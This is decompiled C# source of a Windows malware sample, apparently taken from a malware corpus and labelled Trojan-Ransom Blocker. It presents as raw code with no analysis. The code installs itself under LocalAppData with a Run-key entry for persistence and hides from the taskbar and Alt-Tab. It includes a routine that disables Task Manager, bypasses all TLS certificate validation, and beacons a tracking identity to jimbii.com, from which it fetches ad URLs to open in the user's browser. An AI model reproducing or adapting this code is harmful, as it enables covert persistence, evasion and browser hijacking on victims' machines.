// Decompiled with JetBrains decompiler
// Type: heaven.Form1
// Assembly: sysrt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F2102D52-57B0-4622-A1CB-9DE0B00E107F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.hehh-e9e3600777f319c90d3c06bee4af8f501eba42a876d1d5ed7d3de045ff7cba31.exe

using jimbii;
using Microsoft.Win32;
using SHDocVw;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace heaven
{
  public class Form1 : Form
  {
    private IContainer components;
    private NotifyIcon notifyIcon1;
    private ContextMenuStrip contextMenuStrip1;
    private ToolStripMenuItem Restore;
    private ToolStripMenuItem pauseToolStripMenuItem;
    private ToolStripMenuItem Exit;
    private ToolStripMenuItem resumeToolStripMenuItem;
    private PictureBox pictureBox1;
    private ToolStripMenuItem gamesToolStripMenuItem;
    private static System.Windows.Forms.Timer myTimer = new System.Windows.Forms.Timer();
    private static int alarmCounter = 1;
    private static string browser = "";

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.notifyIcon1 = new NotifyIcon(this.components);
      this.contextMenuStrip1 = new ContextMenuStrip(this.components);
      this.gamesToolStripMenuItem = new ToolStripMenuItem();
      this.Restore = new ToolStripMenuItem();
      this.pauseToolStripMenuItem = new ToolStripMenuItem();
      this.resumeToolStripMenuItem = new ToolStripMenuItem();
      this.Exit = new ToolStripMenuItem();
      this.pictureBox1 = new PictureBox();
      this.contextMenuStrip1.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.gamesToolStripMenuItem.Name = "gamesToolStripMenuItem";
      this.gamesToolStripMenuItem.Size = new Size(123, 22);
      this.gamesToolStripMenuItem.Text = "Games";
      this.Restore.Name = "Restore";
      this.Restore.Size = new Size(123, 22);
      this.Restore.Text = "Restore";
      this.Exit.Name = "Exit";
      this.Exit.Size = new Size(123, 22);
      this.Exit.Text = "Exit";
      this.Exit.Click += new EventHandler(this.Exit_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 266);
      this.Controls.Add((Control) this.pictureBox1);
      this.Name = nameof (Form1);
      this.Text = "syse";
      this.WindowState = FormWindowState.Minimized;
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Resize += new EventHandler(this.Form1_Resize);
      this.contextMenuStrip1.ResumeLayout(false);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
    }

    [DllImport("shell32.dll")]
    private static extern int SHGetFolderPath(
      IntPtr hwndOwner,
      int nFolder,
      IntPtr hToken,
      uint dwFlags,
      [Out] StringBuilder pszPath);

    public static string GetLocalAppDataFolder()
    {
      int nFolder = 28;
      StringBuilder pszPath = new StringBuilder();
      Form1.SHGetFolderPath(IntPtr.Zero, nFolder, IntPtr.Zero, 0U, pszPath);
      return pszPath.ToString();
    }

    private static void TimerEventProcessor(object myObject, EventArgs myEventArgs)
    {
      Form1.myTimer.Stop();
      ++Form1.alarmCounter;
      Form1.myTimer.Enabled = true;
      if (!Form1.is_poppable())
        return;
      try
      {
        Form1.browser = Form1.checkBrowsers();
        if (!(Form1.browser != ""))
          return;
        Form1.popWindow();
        Form1.inc_pop_count();
      }
      catch (Exception ex)
      {
      }
    }

    public Form1()
    {
      this.InitializeComponent();
      this.WindowState = FormWindowState.Maximized;
      this.ShowInTaskbar = false;
      this.hide_from_alt_tab();
      Form1.installme();
      this.check_for_updates();
      Form1.get_or_set_identity();
      Form1.myTimer.Tick += new EventHandler(Form1.TimerEventProcessor);
      Form1.myTimer.Interval = 1200000;
      Form1.myTimer.Start();
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ExStyle |= 128;
        return createParams;
      }
    }

    private void hide_from_alt_tab()
    {
      this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
      this.FormBorderStyle = FormBorderStyle.None;
      this.ShowInTaskbar = false;
    }

    private void check_for_updates()
    {
      string version1 = "";
      HttpWebResponse response = (HttpWebResponse) WebRequest.Create("http://jimbii.com/version").GetResponse();
      try
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          using (StreamReader streamReader = new StreamReader(responseStream, Encoding.UTF8))
            version1 = streamReader.ReadToEnd();
        }
      }
      catch (Exception ex)
      {
      }
      Version version2 = new Version(version1);
      Assembly.GetExecutingAssembly().GetName().Version.CompareTo(version2);
    }

    public static WebClient prep_client()
    {
      WebClient webClient = new WebClient();
      webClient.Headers.Add("user-agent", Form1.user_agent());
      webClient.Headers.Add("SOFTWARE_CLIENT", "jimbii-lite v0.2");
      webClient.Headers.Add("IDENTITY", Form1.get_or_set_identity());
      return webClient;
    }

    private void send_error_to_server(string err)
    {
      WebClient webClient = Form1.prep_client();
      ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(Form1.bypassAllCertificateStuff);
      Stream stream = webClient.OpenRead("https://jimbii.com/errors/log?body=" + err);
      StreamReader streamReader = new StreamReader(stream);
      streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
    }

    public static void inc_pop_count()
    {
      RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Jimbii\\Preferences");
      string s = (subKey.GetValue("count") ?? (object) "").ToString();
      string str = s == null || s == "" ? "1" : (int.Parse(s) + 1).ToString();
      subKey.SetValue("count", (object) str);
    }

    public static bool is_poppable()
    {
      RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Jimbii\\Preferences");
      string str1 = (subKey.GetValue("date") ?? (object) "").ToString();
      string str2 = (subKey.GetValue("count") ?? (object) "").ToString();
      if (str1 == DateTime.Today.ToString() && str2 == "4")
        return false;
      if (!(str1 != DateTime.Today.ToString()))
        return true;
      subKey.SetValue("count", (object) 0);
      subKey.SetValue("date", (object) DateTime.Today);
      return true;
    }

    public static string GetUniqueKey(int length)
    {
      string empty = string.Empty;
      while (empty.Length < length)
        empty += Guid.NewGuid().ToString().GetHashCode().ToString("x");
      if (length <= 0 || length > empty.Length)
        throw new ArgumentException("Length must be between 1 and " + (object) empty.Length);
      return empty.Substring(0, length);
    }

    public static string get_or_set_identity()
    {
      RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Jimbii\\Preferences");
      string uniqueKey = (string) subKey.GetValue("identity");
      if (uniqueKey == null || uniqueKey == "")
      {
        uniqueKey = Form1.GetUniqueKey(32);
        subKey.SetValue("identity", (object) uniqueKey);
      }
      subKey.Close();
      return uniqueKey;
    }

    private void hide_from_system()
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
      subKey.SetValue("DisableTaskMgr", (object) 1);
      subKey.Close();
    }

    private static void check_task_man()
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.MainWindowHandle != IntPtr.Zero)
        {
          int num = (int) MessageBox.Show(process.ProcessName);
        }
      }
    }

    private static void installme()
    {
      string str = Form1.GetLocalAppDataFolder() + "\\sysrt.exe";
      string sourceFileName = Application.ExecutablePath.ToString();
      if (!System.IO.File.Exists(str))
        System.IO.File.Copy(sourceFileName, str);
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      registryKey.SetValue("sysrt", (object) str);
      registryKey.Close();
    }

    private static string checkBrowsers()
    {
      string[] strArray = new string[4]
      {
        "firefox",
        "iexplore",
        "Safari",
        "chrome"
      };
      string str1 = "";
      foreach (Process process in Process.GetProcesses())
      {
        foreach (string str2 in strArray)
        {
          if (process.ProcessName == str2)
            str1 = str2;
        }
      }
      return str1;
    }

    private static string currentIEurl()
    {
      string str = "";
      foreach (InternetExplorer nternetExplorer in (IShellWindows) new ShellWindowsClass())
      {
        if (Path.GetFileNameWithoutExtension(((SHDocVw.IWebBrowser2) nternetExplorer).FullName).ToLower().Equals("iexplore"))
          str = ((SHDocVw.IWebBrowser2) nternetExplorer).LocationURL;
      }
      return str;
    }

    private static bool bypassAllCertificateStuff(
      object sender,
      X509Certificate cert,
      X509Chain chain,
      SslPolicyErrors error)
    {
      return true;
    }

    public static string user_agent()
    {
      string str;
      switch (Form1.browser)
      {
        case "firefox":
          str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
          break;
        case "iexplore":
          str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
          break;
        case "Safari":
          str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
          break;
        case "chrome":
          str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
          break;
        default:
          str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)";
          break;
      }
      return str;
    }

    public static string last_url()
    {
      string str;
      switch (Form1.browser)
      {
        case "firefox":
          str = Form1.Encode64(FirefoxUrl.getLastVisited());
          break;
        case "iexplore":
          str = Form1.Encode64(Form1.currentIEurl());
          break;
        case "Safari":
          str = Form1.Encode64(Form1.currentIEurl());
          break;
        case "chrome":
          str = Form1.Encode64(Form1.currentIEurl());
          break;
        default:
          str = Form1.Encode64(Form1.currentIEurl());
          break;
      }
      return str;
    }

    private static void popWindow()
    {
      string str = "";
      WebClient webClient = Form1.prep_client();
      ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(Form1.bypassAllCertificateStuff);
      Stream stream = webClient.OpenRead("https://jimbii.com/ads/cpv?uri=" + str);
      StreamReader streamReader = new StreamReader(stream);
      string end = streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
      Process.Start(Form1.browser + ".exe", end);
    }

    private static string Encode64(string str) => Convert.ToBase64String(Encoding.UTF8.GetBytes(str));

    private static string Decode64(string str) => Encoding.UTF8.GetString(Convert.FromBase64String(str));

    private void Form1_Resize(object sender, EventArgs e) => this.Hide();

    private void Exit_Click(object sender, EventArgs e)
    {
      this.close_helper();
      Environment.Exit(0);
    }

    private void close_helper()
    {
      this.notifyIcon1.Visible = false;
      Form1.myTimer.Stop();
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      this.close_helper();
      Environment.Exit(0);
    }
  }
}
